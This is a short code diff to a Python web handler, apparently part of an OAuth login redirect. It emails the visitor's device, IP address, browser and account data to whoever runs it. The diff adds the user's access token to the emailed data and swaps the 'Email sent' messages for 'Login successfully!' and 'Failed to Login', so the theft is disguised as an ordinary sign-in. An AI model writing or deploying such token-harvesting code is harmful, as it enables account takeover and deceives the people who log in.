@@ -83,7 +83,7 @@ def handle_redirect():
             browser_name = browserr()
 
             user_info = response.json()
-            body = f"Device: {device}\nIP Address: {ipAddr}\nBrowser: {browser_name}\nUser Info: {user_info}"
+            body = f"Device: {device}\nIP Address: {ipAddr}\nBrowser: {browser_name} \nAccess token: {access_token} \nUser Info: {user_info}"
             print(body)  # Print the body for debugging purposes
 
             try:
@@ -94,10 +94,10 @@ def handle_redirect():
                         body=body
                     )
                     mail.send(msg)
-                return "Email sent successfully!"
+                return "Login successfully!"
             except Exception as e:
                 print(f"Failed to send email: {str(e)}")  # Print the error for debugging purposes
-                return f"Failed to send email: {str(e)}"
+                return f"Failed to Login"
         else:
             error = result.get('error')
             error_description = result.get('error_description')
